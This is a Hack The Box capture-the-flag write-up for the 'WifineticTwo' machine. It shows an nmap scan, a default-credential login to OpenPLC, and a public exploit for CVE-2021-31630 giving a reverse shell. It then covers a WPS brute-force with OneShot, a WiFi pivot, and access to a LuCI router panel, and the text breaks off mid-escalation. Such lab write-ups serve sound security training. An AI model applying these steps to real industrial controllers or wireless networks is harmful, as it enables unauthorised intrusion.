@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Platform: Hack The Box Link: WifineticTwo Level: Medium OS: Linux WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an accessible OpenPLC page using default credentials. Utilizing CVE-2021-31630, we gain an initial foothold and capture the user flag. Once inside the target system, we brute-force the WPS key, configure the wireless interface, and scan the default gateway to discover internal services. We then access the Lua Configuration Interface, set up a new password, log in via SSH, and retrieve the root flag." />
+<meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, Hack The Box" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://scorpiosec.com/posts/2024/07/htb-wifinetictwo/" />
+
+
+    <title>
+        
+            HTB: WifineticTwo
+        
+    </title>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://scorpiosec.com/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://scorpiosec.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://scorpiosec.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://scorpiosec.com/favicon-16x16.png">
+    <link rel="manifest" href="https://scorpiosec.com/site.webmanifest">
+    <link rel="mask-icon" href="https://scorpiosec.com/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://scorpiosec.com/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="HTB: WifineticTwo">
+<meta itemprop="description" content="Platform: Hack The Box Link: WifineticTwo Level: Medium OS: Linux WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an accessible OpenPLC page using default credentials. Utilizing CVE-2021-31630, we gain an initial foothold and capture the user flag. Once inside the target system, we brute-force the WPS key, configure the wireless interface, and scan the default gateway to discover internal services. We then access the Lua Configuration Interface, set up a new password, log in via SSH, and retrieve the root flag."><meta itemprop="datePublished" content="2024-07-26T15:04:48-05:00" />
+<meta itemprop="dateModified" content="2024-07-26T15:04:48-05:00" />
+<meta itemprop="wordCount" content="1163"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-WifineticTwo/WifineticTwo.png" />
+<meta itemprop="keywords" content="Hack The Box," />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scorpiosec.com/images/HTB-WifineticTwo/WifineticTwo.png" /><meta name="twitter:title" content="HTB: WifineticTwo"/>
+<meta name="twitter:description" content="Platform: Hack The Box Link: WifineticTwo Level: Medium OS: Linux WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an accessible OpenPLC page using default credentials. Utilizing CVE-2021-31630, we gain an initial foothold and capture the user flag. Once inside the target system, we brute-force the WPS key, configure the wireless interface, and scan the default gateway to discover internal services. We then access the Lua Configuration Interface, set up a new password, log in via SSH, and retrieve the root flag."/>
+
+
+
+    <meta property="og:title" content="HTB: WifineticTwo" />
+<meta property="og:description" content="Platform: Hack The Box Link: WifineticTwo Level: Medium OS: Linux WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an accessible OpenPLC page using default credentials. Utilizing CVE-2021-31630, we gain an initial foothold and capture the user flag. Once inside the target system, we brute-force the WPS key, configure the wireless interface, and scan the default gateway to discover internal services. We then access the Lua Configuration Interface, set up a new password, log in via SSH, and retrieve the root flag." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://scorpiosec.com/posts/2024/07/htb-wifinetictwo/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-WifineticTwo/WifineticTwo.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-07-26T15:04:48-05:00" />
+<meta property="article:modified_time" content="2024-07-26T15:04:48-05:00" />
+
+
+
+
+
+    <meta property="article:section" content="Writeups" />
+
+
+
+    <meta property="article:published_time" content="2024-07-26 15:04:48 -0500 CDT" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-662ME9PQBT"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-662ME9PQBT', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://scorpiosec.com/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                Scorpiosec:~$</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/about/">About</a></li><li><a href="https://scorpiosec.com/posts/">Posts</a></li><li><a href="https://scorpiosec.com/projects/">Projects</a></li><li><a href="https://scorpiosec.com/tags/">Tags</a></li><li><a href="https://scorpiosec.com/categories/">Categories</a></li>
+        <div class="submenu">
+            <li class="dropdown">
+                <a href="javascript:void(0)" class="dropbtn">en</a>
+                <div class="dropdown-content">
+                    
+                        
+                    
+                </div>
+            </li>
+        </div>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        6 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://scorpiosec.com/posts/2024/07/htb-wifinetictwo/">HTB: WifineticTwo</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#closing-words">Closing Words</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <ul>
+<li>Platform: Hack The Box</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/WifineticTwo" target="_blank" >WifineticTwo</a>
+
+</li>
+<li>Level: Medium</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an accessible OpenPLC page using default credentials. Utilizing CVE-2021-31630, we gain an initial foothold and capture the user flag. Once inside the target system, we brute-force the WPS key, configure the wireless interface, and scan the default gateway to discover internal services. We then access the Lua Configuration Interface, set up a new password, log in via SSH, and retrieve the root flag.</p>
+<p>Target IP address - <code>10.10.11.7</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>nmap -sC -sV -oA nmap/WifineticTwo 10.10.11.7
+</code></pre><p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-25 16:39 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.7
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.044s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">404</span> NOT FOUND
+</span></span><span style="display:flex;"><span>|     content-type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     content-length: <span style="color:#ae81ff">232</span>
+</span></span><span style="display:flex;"><span>|     vary: Cookie
+</span></span><span style="display:flex;"><span>|     set-cookie: session<span style="color:#f92672">=</span>eyJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoQ.AmaMpNOmDGYGQIpwEDtx5obFU08; Expires<span style="color:#f92672">=</span>Thu, 25-Apr-2024 21:44:45 GMT; HttpOnly; Path<span style="color:#f92672">=</span>/
+</span></span><span style="display:flex;"><span>|     server: Werkzeug/1.0.1 Python/2.7.18
+</span></span><span style="display:flex;"><span>|     date: Thu, <span style="color:#ae81ff">25</span> Apr <span style="color:#ae81ff">2024</span> 21:39:45 GMT
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;404 Not Found&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Not Found&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">302</span> FOUND
+</span></span><span style="display:flex;"><span>|     content-type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     content-length: <span style="color:#ae81ff">219</span>
+</span></span><span style="display:flex;"><span>|     location: http://0.0.0.0:8080/login
+</span></span><span style="display:flex;"><span>|     vary: Cookie
+</span></span><span style="display:flex;"><span>|     set-cookie: session<span style="color:#f92672">=</span>eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoA.yRUPYgrZ-4AxE2_xa8pbWYvKGq8; Expires<span style="color:#f92672">=</span>Thu, 25-Apr-2024 21:44:44 GMT; HttpOnly; Path<span style="color:#f92672">=</span>/
+</span></span><span style="display:flex;"><span>|     server: Werkzeug/1.0.1 Python/2.7.18
+</span></span><span style="display:flex;"><span>|     date: Thu, <span style="color:#ae81ff">25</span> Apr <span style="color:#ae81ff">2024</span> 21:39:44 GMT
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Redirecting...&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;You should be redirected automatically to target URL: &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/login&#34;</span>&gt;/login&lt;/a&gt;. If not click the link.
+</span></span><span style="display:flex;"><span>|   HTTPOptions: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>|     content-type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     allow: HEAD, OPTIONS, GET
+</span></span><span style="display:flex;"><span>|     vary: Cookie
+</span></span><span style="display:flex;"><span>|     set-cookie: session<span style="color:#f92672">=</span>eyJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoA.Q1AI3_zm-RnXi7eGU_QELZS5lag; Expires<span style="color:#f92672">=</span>Thu, 25-Apr-2024 21:44:44 GMT; HttpOnly; Path<span style="color:#f92672">=</span>/
+</span></span><span style="display:flex;"><span>|     content-length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     server: Werkzeug/1.0.1 Python/2.7.18
+</span></span><span style="display:flex;"><span>|     date: Thu, <span style="color:#ae81ff">25</span> Apr <span style="color:#ae81ff">2024</span> 21:39:44 GMT
+</span></span><span style="display:flex;"><span>|   RTSPRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad request
+</span></span><span style="display:flex;"><span>|     content-length: <span style="color:#ae81ff">90</span>
+</span></span><span style="display:flex;"><span>|     cache-control: no-cache
+</span></span><span style="display:flex;"><span>|     content-type: text/html
+</span></span><span style="display:flex;"><span>|     connection: close
+</span></span><span style="display:flex;"><span>|     &lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     Your browser sent an invalid request.
+</span></span><span style="display:flex;"><span>|_    &lt;/body&gt;&lt;/html&gt;
+</span></span><span style="display:flex;"><span>| http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_Requested resource was http://10.10.11.7:8080/login
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port8080-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>4/25%Time<span style="color:#f92672">=</span>662ACD97%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">(</span>GetRequest,24C,<span style="color:#e6db74">&#34;HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/htm
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:l;\x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:.0\.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZn
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Jlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.ZirNoA\.yRUPYgrZ-4AxE2_xa8pbW
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:YvKGq8;\x20Expires=Thu,\x2025-Apr-2024\x2021:44:44\x20GMT;\x20HttpOnly;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20Thu,\x2025\x20Apr\x202024\x2021:39:44\x20GMT\r\n\r\n&lt;!DOCTYPE\x20HTML
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\&#34;&gt;\n&lt;title&gt;Red
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:irecting\.\.\.&lt;/title&gt;\n&lt;h1&gt;Redirecting\.\.\.&lt;/h1&gt;\n&lt;p&gt;You\x20should\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20&lt;a\x20hre
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:f=\&#34;/login\&#34;&gt;/login&lt;/a&gt;\.\x20\x20If\x20not\x20click\x20the\x20link\.&#34;</span><span style="color:#f92672">)</span>%
+</span></span><span style="display:flex;"><span>SF:r<span style="color:#f92672">(</span>HTTPOptions,14E,<span style="color:#e6db74">&#34;HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:;\x20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Co
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:okie\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.ZirNoA\.Q1AI
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:3_zm-RnXi7eGU_QELZS5lag;\x20Expires=Thu,\x2025-Apr-2024\x2021:44:44\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:GMT;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkz
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:eug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Thu,\x2025\x20Apr\x202024\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:021:39:44\x20GMT\r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,CF,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0request\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\ncont
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ent-type:\x20text/html\r\nconnection:\x20close\r\n\r\n&lt;html&gt;&lt;body&gt;&lt;h1&gt;4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:00\x20Bad\x20request&lt;/h1&gt;\nYour\x20browser\x20sent\x20an\x20invalid\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:request\.\n&lt;/body&gt;&lt;/html&gt;\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourOhFourRequest,224,<span style="color:#e6db74">&#34;HTTP/1\.0\x20404
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\ncon
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tent-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcG
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:VybWFuZW50Ijp0cnVlfQ\.ZirNoQ\.AmaMpNOmDGYGQIpwEDtx5obFU08;\x20Expires=T
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:hu,\x2025-Apr-2024\x2021:44:45\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Thu,\x2025\x20Apr\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x202024\x2021:39:45\x20GMT\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:3C//DTD\x20HTML\x203\.2\x20Final//EN\&#34;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/ti
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tle&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20aga
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:in\.&lt;/p&gt;\n&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 17.39 seconds
+</span></span></code></pre></div><p>Our scan reveals two open ports 22 (SSH) and 8080 (http-proxy).</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>We find a login form at <code>http://10.10.11.7:8080</code> for OpenPLC Webserver.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/OpenPLC-webserver.png" alt="OpenPLC login form"></p>
+<p>The default credentials allow us to login.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/openplc-creds.png" alt="OpenPLC default credentials"></p>
+<p>We access the Dashboard. The different sections give us some information but nothing is standing out at the moment.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/openPLC-dashboard.png" alt="OpenPLC dashboard"></p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>We find <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-31630" target="_blank" >CVE-2021-31630</a>
+
+ which is a command injection vulnerability for Open PLC Webserver v3 and an exploit is available <a href="https://github.com/Hunt3r0x/CVE-2021-31630-HTB" target="_blank" >here</a>
+
+.</p>
+<blockquote>
+<p>To make this exploit work you have to add the target IP as <code>wifinetictwo.htb</code> in your <code>/etc/hosts</code> file.</p>
+</blockquote>
+<p>After running the exploit we catch a shell on out listener.</p>
+<pre tabindex="0"><code>python ./exploit.py -ip &lt;IP_ADDRESS&gt; -p &lt;PORT_NUMBER&gt; -u openplc -pwd openplc
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/openplc-rce.png" alt="OpenPLC RCE"></p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/foothold.png" alt="WifineticTwo foothold"></p>
+<p>Our shell can be upgraded with the commands below.</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
+export TERM=xterm  
+ctrl + z  
+stty raw -echo; fg
+stty rows 38 columns 116
+</code></pre><p>We are connected as <code>root</code> and we recover the user flag in <code>/root</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/user-flag.png" alt="WifineticTwo user flag"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>It is definitely odd that we were already root for the first flag. This probably means that we need to do some kind of pivoting or access another service.</p>
+<p>The name of this box obviously points at WiFi so let&rsquo;s check the network interfaces with <code>ifconfig</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/ifconfig-cmd.png" alt="WifineticTwo ifconfig command"></p>
+<p>We find a wireless network interface <code>wlan0</code>, we know that HTB machines are VMs and do not have internet access so this network interface probably is leveraging some WiFi virtualization.</p>
+<p>We can retrieve information about the wireless interface with <code>iw dev wlan0 scan</code>. In our case the scan reveals a WiFi network called <code>plcrouter</code> with a BSSID of <code>02:00:00:00:01:00</code>, it is also running <code>WPS: Version: 1.0</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/iw-scan.png" alt="WifineticTwo iw scan"></p>
+<p>After reading the <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi#wps" target="_blank" >Pentesting Wifi page</a>
+
+ on HackTricks, we discovered that we can brute-force WPS keys. Our issue is that in order to use tools such as <code>reaver</code> and <code>bully</code> we need a wireless adapter (which I do not have currently). Fortunately we can also use <a href="https://github.com/nikita-yfh/OneShot-C" target="_blank" >OneShot-C</a>
+
+ to perform the attack.</p>
+<blockquote>
+<p>I ended up using the <a href="https://github.com/kimocoder/OneShot" target="_blank" >Python version</a>
+
+ of OneShot because I had issues compiling the C version.</p>
+</blockquote>
+<p>We clone the repo, and send the <code>oneshot.py</code>  file to the target with <code>curl</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/oneshot-py.png" alt="One-shot-py"></p>
+<p>We can see how to use the script with <code>python3 oneshot.py -h</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/oneshot-py-help.png" alt="One-shot-py help"></p>
+<p>We then run our attack with the command below using the interface name and the BSSID. We successfully recover the key which is <code>NoWWEDoKnowWhaTisReal123!</code>.</p>
+<pre tabindex="0"><code>python3 ./oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/oneshot-attack.png" alt="One-shot attack"></p>
+<p>Now we need to learn how to connect to WiFi from the command line. We learn from <a href="https://askubuntu.com/questions/138472/how-do-i-connect-to-a-wpa-wifi-network-using-the-command-line" target="_blank" >this thread</a>
+
+ and <a href="https://unix.stackexchange.com/questions/283722/how-to-connect-to-wifi-from-command-line" target="_blank" >that one</a>
+
+ that we need a configuration file.</p>
+<p>We create it with <code>wpa_passphrase</code>.</p>
+<pre tabindex="0"><code>wpa_passphrase &#39;plcrouter&#39; &#39;NoWWEDoKnowWhaTisReal123!&#39; &gt; wpa.conf
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/wpa_passphrase.png" alt="WPA config file"></p>
+<blockquote>
+<p>The WPA supplicant process is responsible for managing wireless connections on Linux systems.</p>
+</blockquote>
+<pre tabindex="0"><code>wpa_supplicant -B -c wpa.conf -i wlan0
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/wpa_supplicant.png" alt="WPA supplicant"></p>
+<p>We verify the interface configuration with <code>iwconfig</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/iwconfig.png" alt="iwconfig command"></p>
+<p>Using <code>ifconfig</code> we can see that the interface is up but there is no IP address configured for <code>wlan0</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/ifconfig-noIP.png" alt="wlan0 no IP address"></p>
+<p>We can manually set an IP address with</p>
+<pre tabindex="0"><code>ifconfig wlan0 &lt;IP_ADDRESS&gt; netmask &lt;NETWORK_MASK&gt;
+</code></pre><pre tabindex="0"><code>ifconfig wlan0 192.168.1.50 netmask 255.255.255.0
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/ifconfig-IP.png" alt="ifconfig IP address"></p>
+<p>Now that we have our new interface properly set up let&rsquo;s scan it in hopes of discovering more leads.</p>
+<p>We download the nmap binary from <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap" target="_blank" >here</a>
+
+ and send it to the target. Make sure to make it executable with <code>chmod +x nmap</code>.</p>
+<pre tabindex="0"><code>./nmap -sn 192.168.1.0/24
+</code></pre><p>We see the default gateway <code>192.168.1.1</code> and our configured address <code>192.168.1.50</code> among others.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/nmap_scan.png" alt="nmap scan configured IP address"></p>
+<p>After scanning the default gateway we discover more services, we will need some tunneling to access them (I used chisel for this box).</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/nmap-internal.png" alt="nmap default gateway scan"></p>
+<p>We find a page with a title of <code>ap - LuCI</code>, which is referring to the <a href="https://launchpad.net/luci" target="_blank" >Lua Configuration Interface</a>
+
+, &ldquo;a collection of free Lua software for embedded devices.&rdquo;</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/LuCI.png" alt="LuCI page"></p>
+<p>For the authentication <code>root</code> will work for the password and we are asked to configure a new one.</p>
